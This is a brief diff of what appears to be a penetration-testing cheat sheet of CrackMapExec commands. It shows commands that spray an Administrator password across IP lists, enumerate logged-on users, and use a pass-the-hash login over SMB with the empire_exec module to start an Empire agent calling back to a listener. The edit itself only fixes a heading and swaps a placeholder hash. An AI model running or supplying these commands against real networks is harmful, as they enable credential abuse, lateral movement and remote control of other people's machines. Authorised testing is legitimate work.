@@ -8,6 +8,6 @@ crackmapexec X.X.X.X -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP --lusers --
 
 crackmapexec ip_new.txt -t 100 -u Administrator -p 'XXXXXX' -d WORKGROUP
 
-=== NEW ==
+=== NEW ===
 
-crackmapexec smb IPs.txt -u User -H 12345678902bbbe760ea1f1234567890 -M empire_exec -o LISTENER=CME
+crackmapexec smb IPs.txt -u User -H 33445678902bbbe760ea1f1234567890 -M empire_exec -o LISTENER=CME
